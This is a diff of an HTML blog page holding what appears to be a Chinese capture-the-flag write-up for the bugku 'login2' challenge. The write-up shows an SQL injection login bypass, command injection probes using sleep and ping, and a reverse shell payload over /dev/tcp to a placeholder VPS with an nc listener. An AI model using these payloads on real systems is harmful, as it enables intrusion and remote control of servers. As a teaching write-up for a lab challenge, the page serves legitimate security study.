@@ -17,7 +17,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/2018/07/12/CTF-bugku-login2/1.bmp">
 <meta property="og:image" content="http://yoursite.com/2018/07/12/CTF-bugku-login2/2.bmp">
-<meta property="og:updated_time" content="2018-07-13T07:04:39.980Z">
+<meta property="og:updated_time" content="2018-07-17T15:27:55.402Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bugku-login2-witeup">
 <meta name="twitter:description" content="前言这是一道命令注入的题目，需要用到vps，所以第一次遇到这道题目时没有做出来，由于前两天刚刚买了一台vps，所以马上把这道题翻出来做。 登录首先打开题目是一个登录框，题目提示有union，且在页面返回的响应头有一个tip，base64解码后的内容为">
@@ -185,12 +185,17 @@
 <p>利用以下payload即可登陆成功<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=a' union select 1,md5(1)#&amp;<span class="attribute">password</span>=1</span><br></pre></td></tr></table></figure></p>
 <h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>打开后发现是一个进程监控系统，在post的变量c里面改变传入的值试一下<br><img src="/2018/07/12/CTF-bugku-login2/1.bmp" alt=""><br>注意倒数第二个命令，百度bash后得到如下结果</p>
 <ul>
-<li>sh -c sh即shell，表示命令从-c后的字符串读取</li>
-<li>ps -aux ps即process status 而此命令意思大概是列出所有属于自己和其他用户的进程以及启动时间</li>
-<li>| 表示管道，上一条命令的输出，作为下一条命令参数</li>
-<li>grep 表示使用正则表达式搜索文本，并把匹配的行打印出来<br>所以最后我们的拼接就是grep和c的内容<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3>测试一下会不会有命令注入的回显比如这个<br><img src="/2018/07/12/CTF-bugku-login2/2.bmp" alt=""><br>但是发现echo 1并不会回显<br>于是使用这个payload<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c</span>=aa<span class="comment">;sleep 3</span></span><br></pre></td></tr></table></figure>
+<li><p>sh -c sh即shell，表示命令从-c后的字符串读取</p>
+</li>
+<li><p>ps -aux ps即process status 而此命令意思大概是列出所有属于自己和其他用户的进程以及启动时间</p>
+</li>
+<li><p>| 表示管道，上一条命令的输出，作为下一条命令参数</p>
+</li>
+<li><p>grep 表示使用正则表达式搜索文本，并把匹配的行打印出来</p>
 </li>
 </ul>
+<p>所以最后我们的拼接就是grep和c的内容</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试一下会不会有命令注入的回显比如这个<br><img src="/2018/07/12/CTF-bugku-login2/2.bmp" alt=""><br>但是发现echo 1并不会回显<br>于是使用这个payload<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c</span>=aa<span class="comment">;sleep 3</span></span><br></pre></td></tr></table></figure></p>
 <p>发现浏览器进行了延迟，也就是进行了命令执行<br>再试一下能否ping外网<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c</span>=aa<span class="comment">;ping www.baidu.com</span></span><br></pre></td></tr></table></figure></p>
 <p>浏览器同样延迟执行，说明ping成功</p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>payload:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="number">123</span>;bash -i &gt;&amp; /dev/tcp/your vps ip/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">nc -l -p <span class="number">8888</span></span><br></pre></td></tr></table></figure></p>
